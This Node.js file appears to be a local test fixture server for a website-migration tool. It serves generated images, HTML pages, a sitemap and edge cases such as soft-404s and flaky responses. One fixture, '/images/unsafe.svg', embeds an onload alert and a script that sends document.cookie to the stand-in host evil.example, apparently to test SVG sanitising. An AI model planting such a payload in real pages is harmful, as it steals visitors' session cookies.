#!/usr/bin/env node
/**
 * Local fixture of a Sixshop-hosted site for the migrator tests (no internet needed):
 *   site  http://127.0.0.1:<p1>  pages, robots.txt, sitemap.xml, CSS, logo/favicon/patterns
 *   cdn   http://localhost:<p2>   "contents.sixshop.com"-style uploads: thumbnails vs originals, ?w= renditions,
 *                                 a duplicate, a 404, a soft-404 (HTML with 200), a flaky 503, svg (safe/unsafe),
 *                                 an animated gif, mp4/webm video + poster
 * Images are generated deterministically with sharp at start-up. Every request is logged (for robots/resume tests).
 * Standalone: `node test/fixture-server.mjs` prints the URLs and serves until Ctrl-C.
 */
import http from 'node:http';
import { readFile } from 'node:fs/promises';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import sharp from 'sharp';

const DIR = path.join(path.dirname(fileURLToPath(import.meta.url)), 'fixture-site');

function svgArt(w, h, hue, label) {
  const c1 = `hsl(${hue},70%,55%)`;
  const c2 = `hsl(${(hue + 60) % 360},65%,35%)`;
  return Buffer.from(`<svg xmlns="http://www.w3.org/2000/svg" width="${w}" height="${h}" viewBox="0 0 ${w} ${h}">
    <defs><linearGradient id="g" x1="0" y1="0" x2="1" y2="1"><stop offset="0" stop-color="${c1}"/><stop offset="1" stop-color="${c2}"/></linearGradient></defs>
    <rect width="${w}" height="${h}" fill="url(#g)"/>
    <circle cx="${Math.round(w * 0.7)}" cy="${Math.round(h * 0.35)}" r="${Math.round(Math.min(w, h) * 0.18)}" fill="hsl(${(hue + 180) % 360},80%,70%)"/>
    <rect x="${Math.round(w * 0.08)}" y="${Math.round(h * 0.7)}" width="${Math.round(w * 0.5)}" height="${Math.round(h * 0.12)}" fill="#ffffff" fill-opacity="0.6"/>
    <text x="${Math.round(w * 0.1)}" y="${Math.round(h * 0.2)}" font-size="${Math.max(10, Math.round(h * 0.08))}" fill="#fff">${label}</text>
  </svg>`);
}

async function render(w, h, hue, label, fmt) {
  const s = sharp(svgArt(w, h, hue, label));
  if (fmt === 'png') return s.png({ compressionLevel: 9 }).toBuffer();
  if (fmt === 'webp') return s.webp({ quality: 70 }).toBuffer();
  return s.jpeg({ quality: 70, mozjpeg: true }).toBuffer();
}

function ico(png) {
  const header = Buffer.alloc(22);
  header.writeUInt16LE(0, 0);
  header.writeUInt16LE(1, 2);
  header.writeUInt16LE(1, 4);
  header.writeUInt8(32, 6);
  header.writeUInt8(32, 7);
  header.writeUInt16LE(1, 10);
  header.writeUInt16LE(32, 12);
  header.writeUInt32LE(png.length, 14);
  header.writeUInt32LE(22, 18);
  return Buffer.concat([header, png]);
}

async function animatedGif() {
  const a = await sharp(svgArt(200, 100, 40, 'A')).png().toBuffer();
  const b = await sharp(svgArt(200, 100, 220, 'B')).png().toBuffer();
  try {
    return await sharp([a, b], { join: { animated: true } }).gif({ delay: [300, 300], loop: 0 }).toBuffer();
  } catch {
    return sharp(a).gif().toBuffer();
  }
}

export async function buildMedia() {
  const jeju = await render(1800, 1200, 140, 'jeju', 'jpg');
  const m = {
    // CDN (keys are request paths incl. query)
    '/thumbnails/uploadedFiles/56465/background/image_1000_1600.jpg': [await render(1600, 800, 200, 'bg-thumb', 'jpg'), 'image/jpeg'],
    '/uploadedFiles/56465/background/image_1000.jpg': [await render(2400, 1200, 200, 'bg', 'jpg'), 'image/jpeg'],
    '/uploadedFiles/56465/content/jeju-house.jpg': [jeju, 'image/jpeg'],
    '/uploadedFiles/56465/copy/jeju-house-copy.jpg': [jeju, 'image/jpeg'],
    '/images/seoul.jpg': [await render(2000, 1333, 10, 'seoul', 'jpg'), 'image/jpeg'],
    '/images/seoul.jpg?w=480': [await render(480, 320, 10, 'seoul', 'jpg'), 'image/jpeg'],
    '/images/seoul.jpg?w=960': [await render(960, 640, 10, 'seoul', 'jpg'), 'image/jpeg'],
    '/images/flight-share.jpg': [await render(1400, 700, 260, 'flight share', 'jpg'), 'image/jpeg'],
    '/images/banner.webp': [await render(1600, 600, 300, 'banner', 'webp'), 'image/webp'],
    '/uploadedFiles/56465/og/og-home.jpg': [await render(1200, 630, 30, 'og', 'jpg'), 'image/jpeg'],
    '/uploadedFiles/56465/icon/apple-touch-icon.png': [await render(180, 180, 90, 'W', 'png'), 'image/png'],
    '/uploadedFiles/56465/gallery/g1.png': [await render(800, 600, 170, 'gallery', 'png'), 'image/png'],
    '/images/charter.jpg': [await render(2400, 1600, 210, 'charter', 'jpg'), 'image/jpeg'],
    '/images/charter.webp': [await render(2400, 1600, 211, 'charter', 'webp'), 'image/webp'],
    '/images/poster.jpg': [await render(1280, 720, 50, 'poster', 'jpg'), 'image/jpeg'],
    '/uploadedFiles/56465/content/flaky.jpg': [await render(1000, 750, 320, 'cabin', 'jpg'), 'image/jpeg'],
    '/uploadedFiles/56465/exchange/busan-home.jpg': [await render(1200, 800, 190, 'busan home', 'jpg'), 'image/jpeg'],
    '/uploadedFiles/56465/exchange/busan-home-large.jpg': [await render(2600, 1733, 191, 'busan home', 'jpg'), 'image/jpeg'],
    '/uploadedFiles/56465/exchange/seoul-hanok.png': [await render(1000, 700, 25, 'hanok', 'png'), 'image/png'],
    '/uploadedFiles/56465/product/tour-oreum.jpg': [await render(1600, 1000, 100, 'oreum', 'jpg'), 'image/jpeg'],
    '/uploadedFiles/56465/product/tour-oreum-detail.jpg': [await render(1400, 900, 105, 'oreum detail', 'jpg'), 'image/jpeg'],
    '/uploadedFiles/56465/product/tour-yacht.png': [await render(900, 900, 230, 'yacht', 'png'), 'image/png'],
    '/uploadedFiles/56465/board/story-cover.jpg': [await render(1600, 900, 180, 'haeundae', 'jpg'), 'image/jpeg'],
    '/uploadedFiles/56465/guide/guide-walk.jpg': [await render(1000, 1000, 60, 'guide', 'jpg'), 'image/jpeg'],
    '/images/badge.svg': [Buffer.from('<?xml version="1.0"?>\n<svg xmlns="http://www.w3.org/2000/svg" width="120" height="120" viewBox="0 0 120 120"><circle cx="60" cy="60" r="50" fill="#2a7"/><path d="M35 62l17 17 34-38" stroke="#fff" stroke-width="10" fill="none"/></svg>'), 'image/svg+xml'],
    '/images/unsafe.svg': [Buffer.from('<svg xmlns="http://www.w3.org/2000/svg" width="100" height="40" onload="alert(1)"><script>fetch("https://evil.example/"+document.cookie)</script><rect width="100" height="40" fill="#c33"/></svg>'), 'image/svg+xml'],
    '/images/sparkle.gif': [await animatedGif(), 'image/gif'],
    '/images/secret.jpg': [await render(400, 300, 0, 'secret', 'jpg'), 'image/jpeg'],
    // site host
    'site:/uploads/logo.png': [await render(300, 100, 0, 'WONT', 'png'), 'image/png'],
    'site:/favicon.ico': [ico(await render(32, 32, 0, '', 'png')), 'image/x-icon'],
    'site:/img/pattern.png': [await render(64, 64, 45, '', 'png'), 'image/png'],
    'site:/img/sprite.png': [await render(32, 32, 120, '', 'png'), 'image/png'],
    'site:/img/sprite@2x.png': [await render(64, 64, 120, '', 'png'), 'image/png'],
    'site:/img/promo-strip.jpg': [await render(1200, 200, 330, 'promo', 'jpg'), 'image/jpeg'],
  };
  m['/video/intro.mp4'] = [await readFile(path.join(DIR, 'cdn/video/intro.mp4')), 'video/mp4'];
  m['/video/intro.webm'] = [await readFile(path.join(DIR, 'cdn/video/intro.webm')), 'video/webm'];
  return m;
}

const PAGES = {
  '/': 'index.html',
  '/about_jetpool': 'about_jetpool.html',
  '/localLife': 'localLife.html',
  '/tour_ticket': 'tour_ticket.html',
  '/board/story/1': 'story.html',
  '/guide': 'guide.html',
  '/private/secret': 'secret.html',
};

export async function startFixture() {
  const media = await buildMedia();
  const requests = [];
  const hits = new Map();
  let SITE = '';
  let CDN = '';
  const tpl = async (file) =>
    (await readFile(path.join(DIR, 'site', file), 'utf8'))
      .replaceAll('{{SITE}}', SITE)
      .replaceAll('{{CDN_ESC}}', CDN.replaceAll('/', '\\/'))
      .replaceAll('{{CDN}}', CDN);
  const send = (res, status, type, body, extra = {}) => {
    res.writeHead(status, { 'content-type': type, 'content-length': Buffer.byteLength(body), ...extra });
    res.end(body);
  };

  const siteHandler = async (req, res) => {
    const u = new URL(req.url, SITE);
    requests.push({ server: 'site', path: u.pathname + u.search, ua: req.headers['user-agent'], at: Date.now() });
    const p = u.pathname.length > 1 ? u.pathname.replace(/\/+$/, '') : u.pathname;
    if (p === '/robots.txt') return send(res, 200, 'text/plain; charset=utf-8', await tpl('robots.txt'));
    if (p === '/sitemap.xml') return send(res, 200, 'application/xml', await tpl('sitemap.xml'));
    if (p === '/css/site.css') return send(res, 200, 'text/css', await tpl('site.css'));
    if (p === '/css/extra.css') return send(res, 200, 'text/css', await tpl('extra.css'));
    if (p === '/old-about') return send(res, 301, 'text/html', 'moved', { location: '/about_jetpool' });
    if (p === '/tour_ticket' && u.searchParams.get('idx') === '1') return send(res, 200, 'text/html; charset=utf-8', await tpl('product.html'));
    if (PAGES[p]) return send(res, 200, 'text/html; charset=utf-8', await tpl(PAGES[p]));
    const m = media[`site:${p}`];
    if (m) return send(res, 200, m[1], m[0]);
    return send(res, 404, 'text/html', '<h1>404</h1>');
  };

  const cdnHandler = async (req, res) => {
    const u = new URL(req.url, CDN);
    const key = u.pathname + u.search;
    requests.push({ server: 'cdn', path: key, ua: req.headers['user-agent'], at: Date.now() });
    hits.set(key, (hits.get(key) ?? 0) + 1);
    if (u.pathname === '/robots.txt') return send(res, 404, 'text/plain', 'not found');
    if (u.pathname === '/uploadedFiles/56465/content/flaky.jpg' && hits.get(key) === 1) return send(res, 503, 'text/plain', 'busy', { 'retry-after': '0' });
    if (u.pathname === '/uploadedFiles/56465/product/soft404.jpg') return send(res, 200, 'text/html; charset=utf-8', '<!DOCTYPE html><html><body>상품 이미지가 없습니다</body></html>');
    const m = media[key] ?? (u.search && media[u.pathname] && !/[?&]w=/.test(u.search) ? media[u.pathname] : null);
    if (m) return send(res, 200, m[1], m[0], { 'cache-control': 'public, max-age=31536000' });
    return send(res, 404, 'text/plain', 'not found');
  };

  const listen = (srv, host) => new Promise((r) => srv.listen(0, host, () => r(srv.address().port)));
  const site = http.createServer((q, s) => siteHandler(q, s).catch((e) => send(s, 500, 'text/plain', String(e))));
  const cdn = http.createServer((q, s) => cdnHandler(q, s).catch((e) => send(s, 500, 'text/plain', String(e))));
  const p1 = await listen(site, '127.0.0.1');
  const p2 = await listen(cdn, '127.0.0.1');
  SITE = `http://127.0.0.1:${p1}`;
  CDN = `http://localhost:${p2}`;
  return {
    site: SITE,
    cdn: CDN,
    siteHost: `127.0.0.1:${p1}`,
    cdnHost: `localhost:${p2}`,
    requests,
    media,
    resetLog: () => {
      requests.length = 0;
    },
    close: () => Promise.all([new Promise((r) => site.close(r)), new Promise((r) => cdn.close(r))]),
  };
}

if (process.argv[1] && path.resolve(process.argv[1]) === fileURLToPath(import.meta.url)) {
  const f = await startFixture();
  console.log(`fixture site: ${f.site}\nfixture cdn:  ${f.cdn}\n\ntry:\n  node bin/migrate.mjs all --start ${f.site}/ --start ${f.site}/about_jetpool --asset-hosts ${f.cdnHost} --out /tmp/legacy-out --public-dir /tmp/legacy-public --allow-partial\n`);
  process.on('SIGINT', () => f.close().then(() => process.exit(0)));
}
